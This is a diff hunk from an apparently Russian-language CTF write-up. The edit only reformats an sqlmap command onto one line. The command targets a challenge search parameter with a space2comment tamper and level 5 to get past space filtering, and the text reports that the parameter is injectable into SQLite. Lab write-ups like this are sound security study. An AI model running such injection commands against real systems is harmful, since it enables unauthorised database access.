@@ -107,8 +107,7 @@ no such table: information_schema.tables
 Первый запуск без доп. флагов результата не дал — sqlmap не смог обойти фильтрацию пробелов и предложил `--tamper=space2comment`. Также был добавлен `--level=5` для более агрессивного перебора техник.
 
 ```bash
-sqlmap -u "http://polyctf.ru:5002/search?name=%D0%95%D0%B3%D0%BE%D1%80" \
-  --tamper=space2comment --level=5
+sqlmap -u "http://polyctf.ru:5002/search?name=%D0%95%D0%B3%D0%BE%D1%80" --tamper=space2comment --level=5
 ```
 
 Sqlmap подтвердил СУБД — SQLite, и определил параметр `name` как уязвимый.
